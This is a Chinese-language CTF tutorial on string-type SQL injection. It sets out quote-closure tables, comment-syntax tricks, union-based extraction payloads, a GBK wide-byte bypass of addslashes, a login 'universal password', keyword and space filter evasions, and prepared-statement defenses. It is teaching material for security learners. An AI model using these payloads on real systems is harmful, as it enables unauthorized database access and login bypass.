## 02 字符型注入 -- 考点精讲

> 前置知识：[[01-整数型注入|01-整数型注入]] -- 先掌握 union 五步流程，本篇只解决"如何逃出引号"
>
> 关联教程：[[../../../archstrike-web教学/04-SQL注入攻击|SQL注入实战]] · [[03-报错注入|03-报错注入]]

### 漏洞原理

参数是**字符串**，被引号包裹后拼进 SQL：

```php
<?php
$username = $_GET['username'];
$sql = "SELECT * FROM users WHERE username = '$username'";
?>
```

输入 `admin` 执行：

```sql
SELECT * FROM users WHERE username = 'admin'
```

输入 `admin' and '1'='1` 执行：

```sql
SELECT * FROM users WHERE username = 'admin' and '1'='1'
```

第一个 `'` 提前闭合了原引号，后半段 `and '1'='1` 逃逸为 SQL 语法。与整数型的唯一区别就是**多了一步闭合**。

### 闭合方式判断表

源码中包裹参数的写法常见四种，payload 要与之一一对应：

| 源码写法 | SQL 形态 | 闭合 payload | 注释后的完整 payload |
|---------|---------|-------------|---------------------|
| `'$id'` | `where u='xxx'` | `1'` | `1' and 1=2 -- ` |
| `"$id"` | `where u="xxx"` | `1"` | `1" and 1=2 -- ` |
| `('$id')` | `where u=('xxx')` | `1')` | `1') and 1=2 -- ` |
| `("$id")` | `where u=("xxx")` | `1")` | `1") and 1=2 -- ` |

少见变式还有双括号 `1'))`、混合 `'$id")` 等，按报错信息推断即可。

### 注释符表格

注释掉语句尾部多余的引号和 LIMIT 等结构，是闭合的最后一步：

| 注释符 | 说明 | URL 中注意事项 |
|--------|------|---------------|
| `-- ` | ANSI 标准注释符 | **必须跟一个空格**才生效；URL 里空格要写成 `%20` 或用 `--%20` |
| `--+` | GET 场景常用 | URL 解码时 `+` 变成空格，等价于 `-- ` |
| `#` | MySQL 专属行注释 | `#` 是 URL 片段符会被浏览器截断，必须编码为 `%23` |
| `/**/` | 内联注释（非行注释） | 不能用于注释尾部，常用来**代替空格**绕 WAF |
| `/*!50000 ...*/` | 版本注释 | MySQL 5.0+ 会执行其中内容，关键字绕过利器 |

记忆要点：GET 参数里永远用 `--+` 或 `%23`，POST 表单里可以直接用 `-- ` 和 `#`。

### 闭合测试流程

标准三步定位法：

```text
Step 1: 加单引号看报错
  ?username=admin'
  报错 You have an error in your SQL syntax near ''admin'' LIMIT 0,1'
  从报错回显反推：原句是 'admin' 后面还跟着 LIMIT → 单引号包裹

Step 2: 补全闭合验证
  ?username=admin' and '1'='1     页面正常
  ?username=admin' and '1'='2     页面异常
  真假有差异 → 单引号闭合确认

Step 3: 注释符收尾
  ?username=admin' and 1=2 --+    页面异常（条件生效）
  ?username=admin' and 1=1 --+    页面正常
  注释有效 → 可以开始 union 流程

若 Step 1 无报错但页面异常，依次换 " / ') / ") 重复上述测试。
若所有引号都无反应，可能被 addslashes 转义或参数根本没进 SQL。
```

### 逃逸后利用

闭合成功后，后续流程与整数型完全一致，只是带上闭合符号和注释：

```sql
-- 判列数（假设 3 列、单引号闭合）
?username=admin' order by 3 --+

-- 找回显位
?username=x' union select 1,2,3 --+

-- 爆库爆表爆列取数据
?username=x' union select 1,database(),3 --+
?username=x' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
?username=x' union select 1,flag,3 from sqli.flag --+
```

万能模板记住一个就够：

```sql
x' union select 1,(子查询),3 --+
```

### 宽字节绕过（引号被转义时）

后端对参数做了 `addslashes` 或开启 `magic_quotes_gpc` 时，`'` 会变成 `\'`（0x5c27），单引号无法逃逸：

```text
输入: admin'          → 拼接为 admin\'      → 引号被转义失效
输入: admin%df'       → 拼接为 admin%df%5c%27
                        %df%5c 在 GBK 中是合法汉字"運"
                        → 变成 運 + '，单引号成功逃逸！
```

利用条件：数据库连接编码为 GBK 系列（如 `SET NAMES gbk`），payload 中 `%df` 可换成 `%bf`、`%aa` 等。UTF-8 连接下宽字节无效，只能找无引号上下文（数字比较 `and length(database())=4`）绕过。

### GET 与 POST 场景差异

| 维度 | GET 注入 | POST 注入 |
|------|---------|-----------|
| 参数位置 | URL 查询串 `?u=xxx` | 请求体 `u=xxx&p=yyy` |
| 编码要求 | 引号可省略编码，空格用 %20/+，`#` 必须 %23 | 原样写入 body，注释符无需 URL 编码 |
| 注释符选择 | `--+` 或 `%23` | `-- ` 或 `#` 都可以 |
| 常见位置 | 搜索、翻页、详情页 id | 登录框、注册框、留言板 |
| 测试工具 | 浏览器直接改 URL 或 sqlmap -u | sqlmap -r 抓包文件 |

登录框经典万能密码就是 POST 字符型注入：

```sql
-- 用户名输入: admin' or 1=1 #    密码随便填
SELECT * FROM users WHERE username='admin' or 1=1 #' AND password='xxx'
-- 返回第一行记录，直接登录成功
```

### CTF 例题思路表

| 题目特征 | 思路 |
|---------|------|
| 输入单引号页面报错，报错带 LIMIT 字样 | 从报错反推闭合方式，按本篇三步走 |
| 输入单引号无反应，双引号报错 | 双引号闭合，其余不变 |
| 引号全部被转义（\'）且连接为 GBK | 宽字节注入 `%df'` 吃掉反斜杠 |
| 引号被转义且为 UTF-8 连接 | 找无引号场景：布尔盲注用数字比较 `and length(database())=4` |
| 登录框提示用户不存在/密码错误两种不同文案 | 万能密码 `xx' or 1=1 #` 直接进后台 |
| 关键字被过滤（union/select 被删） | 双写 `uniunionon`、大小写 `UniOn`、内联注释 `un/**/ion`、等价函数 `mid()/left()` 替代 substr |
| 空格被过滤 | `%20`→`%0a`(换行)、`%09`(tab)、`/**/` 注释替代 |

#### 例题完整流程示范（sqli-labs Less-5 风格）

```text
1. ?id=1'                          → 报错 near ''1'' LIMIT 0,1
                                     反推源码: select ... where id='$id' LIMIT 0,1
2. ?id=1' and '1'='1               → 正常；?id=1' and '1'='2 → 异常
3. ?id=1' order by 4 --+           → 报错；order by 3 --+ 正常 → 3 列
4. ?id=1' union select 1,2,3 --+   → 页面无回显位（只显示 You are in）
                                     有报错回显 → 转 [[03-报错注入|03-报错注入]]
```

结论：闭合判断是所有字符型题目的第一步，判断完再根据"有无回显位/有无报错"选择 union 或报错或盲注路线。

### 防御手段

#### addslashes 的局限性

```php
<?php
$username = addslashes($_GET['username']);
$sql = "SELECT * FROM users WHERE username = '$username'";
?>
```

addslashes 把 `'` 变成 `\'`，看似安全，但有两大坑：

| 局限 | 说明 |
|------|------|
| **宽字节绕过** | GBK 编码下 `%df%5c`（df + 反斜杠）组成合法汉字"運"，`%df'` 输入后变成 `%df\'` → `%df%5c` 被吃掉，`'` 成功逃逸 |
| **不防无引号场景** | 若参数拼在数字上下文（如 limit、order by），转义引号毫无作用 |

正确做法依然是预编译：

```php
<?php
$stmt = $pdo->prepare('SELECT * FROM users WHERE username = :name');
$stmt->execute([':name' => $username]);
?>
```

外加两点：数据库连接统一使用 UTF-8（杜绝宽字节）、错误信息不回显到页面。
